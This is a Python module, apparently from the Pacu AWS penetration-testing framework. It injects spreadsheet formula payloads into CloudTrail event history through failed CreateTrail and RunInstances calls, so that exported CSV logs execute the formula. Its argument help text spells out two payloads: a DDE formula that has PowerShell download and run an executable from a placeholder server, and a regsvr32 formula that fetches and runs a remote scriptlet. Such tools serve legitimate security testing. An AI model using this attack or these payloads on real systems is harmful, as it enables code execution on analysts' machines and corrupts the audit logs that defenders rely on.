#!/usr/bin/env python3
import argparse
from botocore.exceptions import ClientError

module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'cloudtrail__csv_injection',

    # Name and any other notes about the author
    'author': 'Spencer Gietzen of Rhino Security Labs',

    # Category of the module. Make sure the name matches an existing category.
    'category': 'LATERAL_MOVE',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'Inject malicious formulas/data into CloudTrail event history.',

    # Description about what the module does and how it works
    'description': 'This module will attempt to create a CloudTrail trail with a malicious Microsoft Excel and/or Google Sheets formula as the name as well as try to create an EC2 instance with the formula as the image ID. This is because a failed call won\'t work correctly. The failed events will be logged to CloudTrail\'s "Event history" page, where the past 90 days of API calls are listed. The logs can be exported to a .csv file, which due to the way that CloudTrail displays/exports the "Affected Resources" column, the formula we supply as a payload will attempt to execute. Payloads exist for both Microsoft Excel and Google Sheets. My blog post for this specific module is here: https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/. Further reading can be found here: https://www.we45.com/2017/02/14/csv-injection-theres-devil-in-the-detail/ and here: http://georgemauer.net/2017/10/07/csv-injection.html',

    # A list of AWS services that the module utilizes during its execution
    'services': ['CloudTrail'],

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': [],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': ['--regions', '--payload'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--regions', required=False, help='A comma-separated list of regions to target. The default is every region.')
parser.add_argument('--payload', required=True, help='The formula payload to use. Some examples:\n This formula uses PowerShell to contact an external server to download and execute a binary file: =cmd|\' /C powershell Invoke-WebRequest "http://your-server.com/test.exe" -OutFile "$env:Temp\\shell.exe"; Start-Process "$env:Temp\\shell.exe"\'!A1\nThis formula contacts a remote server to download and execute a .sct file: =MSEXCEL|\'\\..\\..\\..\\Windows\\System32\\regsvr32 /s /n /u /i:http://your-server.com/SCTLauncher.sct scrobj.dll\'!\'\'')


def main(args, pacu_main):
    ###### Don't modify these. They can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = pacu_main.print
    get_regions = pacu_main.get_regions
    ######

    summary_data = {'success': 0, 'fails': 0}
    if args.regions:
        regions = args.regions.split(',')
    else:
        regions = get_regions('cloudtrail')

    for region in regions:
        print('Starting region {}...'.format(region))
        print('  Starting CreateTrail attack...')
        client = pacu_main.get_boto3_client('cloudtrail', region)
        try:
            client.create_trail(
                Name=args.payload,
                S3BucketName=args.payload
            )
            print('    FAILURE:')
            print('      Trail created. Payload fit the parameters for a valid trail name')
            print('      Exiting...')
            summary_data['fails'] += 1
            return summary_data
        except ClientError as error:
            code = error.response['Error']['Code']
            if code == 'InvalidTrailNameException':
                print('    Attack succeeded')
                summary_data['success'] += 1
                continue
            else:
                print('  FAILURE:')
                if code == 'AccessDeniedException':
                    print('    MISSING NEEDED PERMISSIONS')
                else:
                    print('    ' + str(code))

        print('  Starting RunInstances attack...')
        client = pacu_main.get_boto3_client('ec2', region)
        try:
            client.run_instances(
                ImageId=args.payload,
                MaxCount=1,
                MinCount=1
            )
            print('    FAILURE:')
            print('      Instance Launched. Payload fit the parameters for a valid ImageId')
            print('      Exiting...')
            summary_data['fails'] += 1
            return summary_data
        except ClientError as error:
            code = error.response['Error']['Code']
            if code == 'InvalidAMIID.Malformed':
                print('    Attack succeeded')
                summary_data['success'] += 1
                continue
            else:
                print('  FAILURE:')
                if code == 'AccessDeniedException':
                    print('    MISSING NEEDED PERMISSIONS')
                else:
                    print('    ' + str(code))
        summary_data['fails'] += 1
    return summary_data


def summary(data, pacu_main):
    out = '  {} CloudTrail regions(s) successfully attacked.\n'.format(data['success'])
    out += '  {} CloudTrail regions(s) failed to be attacked.\n'.format(data['fails'])
    return out
